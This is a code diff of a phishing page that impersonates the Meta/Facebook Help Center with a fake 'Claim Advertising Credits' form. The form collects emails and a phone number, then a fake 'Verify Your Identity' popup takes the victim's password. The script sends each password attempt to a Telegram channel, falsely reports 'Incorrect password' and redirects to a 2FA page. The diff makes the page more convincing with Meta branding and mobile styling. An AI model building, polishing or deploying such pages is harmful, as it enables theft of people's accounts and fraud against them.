@@ -6,7 +6,7 @@
     <title>Help Center - Claim Advertising Credits</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             background-color: #f0f2f5;
             display: flex;
@@ -14,45 +14,54 @@
             min-height: 100vh;
         }
         .header {
-            background-color: #355797;
-            border-bottom: 1px solid #355797;
-            padding: 10px 20px;
+            background-color: #1877f2;
+            padding: 12px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            box-shadow: 0 2px 4px rgba(0,0,0,.08);
+            box-shadow: 0 2px 4px rgba(0,0,0,.1);
             position: sticky;
             top: 0;
             z-index: 1000;
         }
         .header .search-bar {
             flex-grow: 1;
-            margin-right: 20px;
-            max-width: 500px;
+            margin: 0 15px;
+            max-width: 400px;
         }
         .header .search-bar input {
             width: 100%;
-            padding: 8px 15px;
-            border: 1px solid #ddd;
+            padding: 10px 15px;
+            border: none;
             border-radius: 20px;
-            font-size: 15px;
+            font-size: 16px;
             outline: none;
-            box-sizing: border-box;
-            background-color: rgba(255, 255, 255, 0.2);
-            color: #fff;
+            background-color: #ffffff;
+            color: #1c2b33;
+            box-shadow: 0 1px 3px rgba(0,0,0,.1);
         }
         .header .search-bar input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
+            color: #606770;
         }
         .header .help-center-link {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
             color: #fff;
             text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         .header .language {
             font-size: 14px;
             color: #fff;
+            cursor: pointer;
+        }
+        .hamburger-menu {
+            display: none;
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
         }
         .main-content {
             display: flex;
@@ -72,103 +81,114 @@
             margin: 0;
         }
         .sidebar ul li {
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
         .sidebar ul li a {
             text-decoration: none;
-            color: #333;
-            padding: 8px 10px;
+            color: #1c2b33;
+            padding: 10px 12px;
             display: block;
             border-radius: 6px;
+            font-size: 15px;
         }
         .sidebar ul li a:hover, .sidebar ul li a.active {
-            background-color: #f0f2f5;
+            background-color: #e7f3ff;
             color: #1877f2;
         }
         .content-area {
             flex-grow: 1;
-            padding: 20px;
+            padding: 15px;
             background-color: #f0f2f5;
         }
         .form-container {
             background-color: #fff;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,.1);
-            max-width: 700px;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,.1);
+            max-width: 600px;
             margin: 0 auto;
         }
         .form-container h2 {
-            font-size: 24px;
+            font-size: 22px;
             color: #1c2b33;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
         .form-container p {
-            font-size: 15px;
+            font-size: 14px;
             color: #606770;
-            margin-bottom: 20px;
-            line-height: 1.5;
+            margin-bottom: 15px;
+            line-height: 1.6;
         }
         .form-container label {
             display: block;
             font-size: 14px;
-            color: #606770;
-            margin-bottom: 5px;
+            color: #1c2b33;
+            margin-bottom: 6px;
+            font-weight: 500;
         }
         .form-container input[type="text"],
         .form-container input[type="email"],
         .form-container textarea {
-            width: calc(100% - 20px);
-            padding: 12px 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #ccd0d5;
             border-radius: 6px;
             font-size: 15px;
             box-sizing: border-box;
+            transition: border-color 0.2s;
         }
         .form-container input[type="text"]:focus,
         .form-container input[type="email"]:focus,
         .form-container textarea:focus {
             border-color: #1877f2;
             outline: none;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
         .form-container textarea {
             resize: vertical;
-            min-height: 120px;
+            min-height: 100px;
         }
         .form-container .ticket-number {
             font-weight: bold;
             color: #1877f2;
         }
         .form-container .note {
-            font-size: 13px;
+            font-size: 12px;
             color: #606770;
-            margin-top: -10px;
-            margin-bottom: 15px;
+            margin-top: -8px;
+            margin-bottom: 12px;
         }
         .form-container .terms {
-            font-size: 13px;
+            font-size: 12px;
             color: #606770;
-            margin-top: 20px;
-            margin-bottom: 20px;
+            margin: 15px 0;
         }
         .form-container .terms a {
             color: #1877f2;
             text-decoration: none;
         }
+        .form-container .terms a:hover {
+            text-decoration: underline;
+        }
         .form-container button {
             background-color: #1877f2;
             color: #fff;
-            padding: 12px 25px;
+            padding: 12px 20px;
             border: none;
             border-radius: 6px;
-            font-size: 16px;
+            font-size: 15px;
+            font-weight: bold;
             cursor: pointer;
-            display: block;
-            margin-top: 20px;
+            width: 100%;
+            transition: background-color 0.2s, transform 0.1s;
         }
         .form-container button:hover {
             background-color: #166fe5;
+            transform: translateY(-1px);
         }
         .popup-overlay {
             position: fixed;
@@ -176,7 +196,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.6);
+            background-color: rgba(0, 0, 0, 0.5);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -185,91 +205,137 @@
         }
         .popup-content {
             background-color: #fff;
-            padding: 30px;
-            border-radius: 8px;
+            padding: 25px;
+            border-radius: 10px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
             width: 90%;
-            max-width: 450px;
+            max-width: 400px;
             text-align: center;
         }
         .popup-content h3 {
-            font-size: 20px;
+            font-size: 18px;
             color: #1c2b33;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
         .popup-content p {
-            font-size: 15px;
+            font-size: 14px;
             color: #606770;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .popup-content input[type="password"] {
-            width: calc(100% - 20px);
-            padding: 12px 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ddd;
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #ccd0d5;
             border-radius: 6px;
-            font-size: 16px;
+            font-size: 15px;
             box-sizing: border-box;
-            outline: none;
+            transition: border-color 0.2s;
         }
         .popup-content input[type="password"]:focus {
             border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            outline: none;
         }
         .popup-content button {
             background-color: #1877f2;
             color: #fff;
-            padding: 12px 25px;
+            padding: 12px 20px;
             border: none;
             border-radius: 6px;
-            font-size: 16px;
+            font-size: 15px;
+            font-weight: bold;
             cursor: pointer;
-            outline: none;
+            width: 100%;
+            transition: background-color 0.2s, transform 0.1s;
         }
         .popup-content button:hover {
             background-color: #166fe5;
+            transform: translateY(-1px);
         }
         .popup-content .error-message {
             color: #fa3e3e;
-            font-size: 13px;
-            margin-top: -10px;
+            font-size: 12px;
+            margin-top: -8px;
             margin-bottom: 10px;
             text-align: left;
             display: none;
         }
         @media (max-width: 768px) {
-            .sidebar {
-                display: none;
-            }
             .header {
-                display: none;
-            }
-            .main-content {
-                flex-direction: column;
-            }
-            .header {
-                flex-wrap: wrap;
-                justify-content: center;
+                padding: 10px 15px;
+                justify-content: space-between;
             }
             .header .search-bar {
-                margin: 10px 0;
-                max-width: 100%;
+                display: none;
             }
-            .header .help-center-link,
+            .header .help-center-link {
+                font-size: 18px;
+            }
             .header .language {
-                margin: 5px 10px;
+                font-size: 13px;
+            }
+            .hamburger-menu {
+                display: block;
+            }
+            .sidebar {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 80%;
+                max-width: 300px;
+                height: 100%;
+                z-index: 1001;
+                padding-top: 60px;
+                background-color: #fff;
+                box-shadow: 2px 0 8px rgba(0,0,0,.1);
+                transition: transform 0.3s ease;
+                transform: translateX(-100%);
+            }
+            .sidebar.active {
+                display: block;
+                transform: translateX(0);
             }
             .content-area {
                 padding: 10px;
             }
             .form-container {
                 padding: 20px;
+                max-width: 100%;
+            }
+            .form-container h2 {
+                font-size: 20px;
+            }
+            .form-container p,
+            .form-container label,
+            .form-container input,
+            .form-container textarea,
+            .form-container button {
+                font-size: 14px;
+            }
+            .popup-content {
+                padding: 20px;
+                max-width: 90%;
+            }
+            .popup-content h3 {
+                font-size: 16px;
+            }
+            .popup-content p,
+            .popup-content input,
+            .popup-content button {
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
     <div class="header">
-        <a href="#" class="help-center-link">facebook</a>
+        <span class="hamburger-menu" id="hamburgerMenu">☰</span>
+        <a href="#" class="help-center-link">
+            <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" style="height: 24px;">
+            Help Center
+        </a>
         <div class="search-bar">
             <input type="text" placeholder="How can we help?">
         </div>
@@ -277,7 +343,7 @@
     </div>
 
     <div class="main-content">
-        <div class="sidebar">
+        <div class="sidebar" id="sidebar">
             <ul>
                 <li><a href="#">Creating an Account</a></li>
                 <li><a href="#">Your Profile</a></li>
@@ -304,9 +370,12 @@
 
         <div class="content-area">
             <div class="form-container">
-                <h2>Claim Advertising Credits</h2>
+                <h2>
+                    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" style="height: 20px; margin-right: 8px;">
+                    Claim Advertising Credits
+                </h2>
                 <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
-                <p>We may need to collect some information from you to process your advertising credits claim. Complete the required information and submit the form.</p>
+                <p>We need some information to process your advertising credits claim. Please complete the form below.</p>
 
                 <form id="claimForm">
                     <label for="yourName">Page Name *</label>
@@ -314,21 +383,21 @@
 
                     <label for="businessEmail">Business Email *</label>
                     <input type="email" id="businessEmail" name="businessEmail" required>
-                    <p class="note">Notifications about the credit claim status will be sent to this email.</p>
+                    <p class="note">We'll send claim status updates to this email.</p>
 
                     <label for="personalEmail">Personal Email *</label>
                     <input type="email" id="personalEmail" name="personalEmail" required>
 
                     <label for="mobilePhoneNumber">Mobile Phone Number *</label>
                     <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber" required>
-                    <p class="note">We can use this phone number to contact you for verification.</p>
+                    <p class="note">We may contact you via this number for verification.</p>
 
-                    <label for="additionalInfo">Please provide us information that will help us process your claim</label>
+                    <label for="additionalInfo">Additional Information (Optional)</label>
                     <textarea id="additionalInfo" name="additionalInfo"></textarea>
 
-                    <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>
+                    <p class="terms">By submitting, you agree to our <a href="#">Terms and Community Standards</a>.</p>
 
-                    <button type="submit" id="sendButton">Send</button>
+                    <button type="submit" id="sendButton">Submit Claim</button>
                 </form>
             </div>
         </div>
@@ -336,8 +405,8 @@
 
     <div class="popup-overlay" id="passwordPopupOverlay">
         <div class="popup-content">
-            <h3>Please Enter Your Password</h3>
-            <p>For security reasons, please enter your password to continue.</p>
+            <h3>Verify Your Identity</h3>
+            <p>Enter your password to securely proceed with your claim.</p>
             <input type="password" id="passwordInput" placeholder="Password" required>
             <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
             <button id="confirmPasswordButton">Confirm</button>
@@ -363,6 +432,8 @@
         const passwordInput = document.getElementById('passwordInput');
         const passwordError = document.getElementById('passwordError');
         const confirmPasswordButton = document.getElementById('confirmPasswordButton');
+        const hamburgerMenu = document.getElementById('hamburgerMenu');
+        const sidebar = document.getElementById('sidebar');
 
         // --- Utility Functions ---
         function generateRandomTicketNumber() {
@@ -466,7 +537,7 @@
                 message += `<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
                 await sendMessageToTelegram(message);
                 passwordError.textContent = 'Incorrect password. Please try again.';
-                passwordError.style.display = 'block';
+                languageError.style.display = 'block';
             } else if (passwordAttemptCount === 2) {
                 passwordAttemptValue2 = password;
                 message += `<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
@@ -481,6 +552,18 @@
                 window.location.href = '2fa_page.html';
             }
             passwordInput.value = '';
+        });
+
+        // Hamburger Menu Toggle
+        hamburgerMenu.addEventListener('click', () => {
+            sidebar.classList.toggle('active');
+        });
+
+        // Close sidebar when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!sidebar.contains(e.target) && !hamburgerMenu.contains(e.target) && sidebar.classList.contains('active')) {
+                sidebar.classList.remove('active');
+            }
         });
 
         document.addEventListener('DOMContentLoaded', () => {
